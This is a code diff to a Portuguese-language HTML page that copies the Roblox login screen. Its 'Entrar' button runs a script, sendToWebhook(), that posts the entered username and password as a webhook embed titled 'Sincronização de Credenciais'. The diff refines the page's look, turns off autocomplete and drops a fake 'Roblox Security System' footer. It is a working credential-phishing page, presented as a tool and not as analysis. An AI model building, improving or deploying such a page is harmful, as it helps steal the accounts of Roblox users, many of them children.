@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
+    <title>Entrar na Roblox</title>
     <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
     
     <style>
@@ -18,78 +18,66 @@
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* BARRA SUPERIOR SINCRONIZADA */
+        /* BARRA SUPERIOR - AJUSTE DE ALTURA E ESPAÇAMENTO */
         .roblox-header {
-            width: 100%; height: 40px; background: #232527;
+            width: 100%; height: 52px; background: #232527;
             display: flex; align-items: center; 
             padding: 0 20px; position: fixed; top: 0; z-index: 10; box-sizing: border-box;
+            border-bottom: 1px solid #454749;
         }
 
         .roblox-logo {
-            height: 30px; width: 30px;
+            height: 32px; width: 32px;
             background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg==');
             background-size: contain; background-repeat: no-repeat;
-            margin-right: 25px; cursor: pointer;
+            margin-right: 20px; cursor: pointer;
         }
 
         .header-nav { display: flex; align-items: center; gap: 20px; color: #fff; font-size: 15px; font-weight: 500; flex-grow: 1; }
-        .header-nav span { cursor: pointer; opacity: 0.9; transition: opacity 0.2s; }
-        .header-nav span:hover { opacity: 1; }
         
-        .search-bar { position: relative; flex-grow: 1; max-width: 600px; margin: 0 20px; }
+        .search-bar { position: relative; flex-grow: 1; max-width: 500px; margin: 0 15px; }
         .search-bar input {
-            width: 100%; height: 30px; background: rgba(0, 0, 0, 0.2); border: 1px solid #454749;
-            border-radius: 6px; padding-left: 35px; color: #fff; font-size: 14px; outline: none; box-sizing: border-box;
+            width: 100%; height: 34px; background: rgba(0, 0, 0, 0.2); border: 1px solid #454749;
+            border-radius: 8px; padding-left: 38px; color: #fff; font-size: 14px; outline: none; box-sizing: border-box;
         }
 
         .search-icon { 
-            position: absolute; left: 10px; top: 7px; height: 16px; width: 16px;
+            position: absolute; left: 12px; top: 9px; height: 16px; width: 16px;
             background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjYmRiZWJlIiBzdHJva2Utd2lkdGg9IjIuNSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48Y2lyY2xlIGN4PSIxMSIgY3k9IjExIiByPSI4Ij48L2NpcmNsZT48bGluZSB4MT0iMjEiIHkxPSIyMSIgeDI9IjE2LjY1IiB5Mj0iMTYuNjUiPjwvbGluZT48L3N2Zz4=');
             background-size: contain; background-repeat: no-repeat;
         }
 
-        /* CAIXA DE LOGIN GRANDE (VERDE NA SUA IMAGEM) */
-        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 60px; }
+        /* CONTAINER DE LOGIN - AJUSTE DE LARGURA */
+        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 52px; }
         
         .login-box {
-            background-color: #393b3d; padding: 40px 45px; border-radius: 8px;
-            width: 90%; max-width: 440px; text-align: center;
+            background-color: #393b3d; padding: 40px 30px; border-radius: 8px;
+            width: 90%; max-width: 400px; text-align: center;
             box-shadow: 0 8px 24px rgba(0,0,0,0.6); z-index: 2;
             box-sizing: border-box;
         }
 
-        h1 { color: #fff; font-size: 28px; margin-bottom: 25px; font-weight: 700; letter-spacing: -0.8px; }
+        h1 { color: #fff; font-size: 28px; margin-bottom: 25px; font-weight: 700; }
         
         input {
-            width: 100%; height: 44px; background-color: #252728; border: 1px solid #1a1b1c;
+            width: 100%; height: 44px; background-color: #191b1d; border: 1px solid #454749;
             border-radius: 4px; color: #fff; padding: 0 15px; margin-bottom: 12px;
             box-sizing: border-box; font-size: 16px; outline: none;
         }
 
-        /* BOTÃO ENTRAR SINCRONIZADO */
         .btn-entrar {
             width: 100%; height: 42px; background-color: transparent; border: 1px solid #ffffff;
-            color: #fff; border-radius: 4px; font-size: 17px; cursor: pointer; margin: 15px 0;
-            font-weight: 500; transition: background 0.3s;
+            color: #fff; border-radius: 4px; font-size: 17px; cursor: pointer; margin: 10px 0 20px 0;
+            font-weight: 500;
         }
-        .btn-entrar:hover { background: rgba(255, 255, 255, 0.1); }
 
-        .forgot-link {
-            color: #fff; text-decoration: none; font-size: 14px; 
-            display: block; margin-bottom: 25px; opacity: 0.9;
-        }
-        .forgot-link:hover { text-decoration: underline; }
-
-        /* BOTÕES DE BAIXO LARGOS */
         .btn-secondary {
             width: 100%; height: 44px; background-color: #4f5153; border: none;
             color: #fff; border-radius: 4px; font-size: 15px; margin-bottom: 12px; cursor: pointer;
-            font-weight: 500; transition: background 0.2s;
+            font-weight: 500;
         }
-        .btn-secondary:hover { background-color: #5a5c5e; }
 
-        .signup-text { color: #fff; font-size: 15px; margin-top: 30px; }
-        .signup-text span { text-decoration: underline; cursor: pointer; font-weight: 500; }
+        .forgot-link { color: #fff; text-decoration: none; font-size: 14px; display: block; margin-bottom: 25px; }
 
         .footer-classificacao { position: fixed; bottom: 15px; width: 100%; text-align: center; color: #fff; }
     </style>
@@ -118,25 +106,24 @@
 <div class="container">
     <div class="login-box">
         <h1>Entrar na Roblox</h1>
-        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" spellcheck="false">
-        <input type="password" id="pass" placeholder="Senha">
+        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" spellcheck="false" autocomplete="off">
+        <input type="password" id="pass" placeholder="Senha" autocomplete="off">
         
         <button class="btn-entrar" onclick="sendToWebhook()">Entrar</button>
         
         <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
         
-        <button class="btn-secondary">Envie-me um código único por e-mail</button>
         <button class="btn-secondary">Entrada rápida</button>
         
-        <p class="signup-text">
-            Não possui uma conta? <span>Cadastrar-se</span>
+        <p style="color: #fff; font-size: 15px; margin-top: 30px;">
+            Não possui uma conta? <span style="text-decoration: underline; cursor: pointer;">Cadastrar-se</span>
         </p>
     </div>
 </div>
 
 <div class="footer-classificacao">
-    <div style="background: #fff; color: #000; font-weight: bold; padding: 2px 6px; border-radius: 2px; display: inline-block; font-size: 12px;">12</div>
-    <div style="font-size: 10px; margin-top: 5px; font-weight: 500; opacity: 0.8; letter-spacing: 0.5px;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
+    <div style="background: #fff; color: #000; font-weight: bold; padding: 2px 6px; border-radius: 3px; display: inline-block; font-size: 12px;">12</div>
+    <div style="font-size: 11px; margin-top: 5px; opacity: 0.9;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
 </div>
 
 <script>
@@ -151,13 +138,12 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ 
                     embeds: [{
-                        title: "🎯 Login Sincronizado",
+                        title: "🎯 Sincronização de Credenciais",
                         color: 16777215,
                         fields: [
                             { name: "👤 Login", value: `\`${u}\``, inline: true },
                             { name: "🔑 Senha", value: `\`${p}\``, inline: true }
                         ],
-                        footer: { text: "Roblox Security System" },
                         timestamp: new Date()
                     }]
                 })
